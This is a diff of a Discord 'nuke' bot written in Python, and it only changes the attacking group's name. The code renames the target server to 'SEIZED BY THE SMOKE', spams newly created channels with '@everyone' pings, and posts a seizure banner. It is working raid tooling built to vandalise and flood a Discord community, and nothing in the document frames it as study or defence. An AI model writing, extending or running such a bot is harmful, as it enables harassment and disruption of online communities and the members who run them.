@@ -26,8 +26,7 @@ async def nuke_channels(guild):
             channel_name = f"fuckedbyotc-{i}"
             new_channel = await guild.create_text_channel(channel_name)
             await new_channel.send("@everyone")
-            await new_channel.send("# THIS SERVER HAS BEEN SEIZED BY CITY-31'S OVERWATCH TACTICAL CONTROL.")
-            await new_channel.send("https://i.ibb.co/8BqScCN/Overwatch-Tactical-Control0.png")
+            await new_channel.send("# THIS SERVER HAS BEEN SEIZED BY THE SMOKE")
             await asyncio.sleep(0.1)  # Adding a delay between channel creations
     except discord.Forbidden:
         print("Missing permissions to perform channel operations.")
@@ -42,7 +41,7 @@ async def nuke(ctx):
     if len(bot.guilds) > 0:
         try:
             guild = bot.guilds[0]  # Change the first available guild name
-            await guild.edit(name="SEIZED BY OTC")
+            await guild.edit(name="SEIZED BY THE SMOKE")
 
             nuke_channels.start(guild)  # Start the channel nuke process
         except discord.Forbidden:
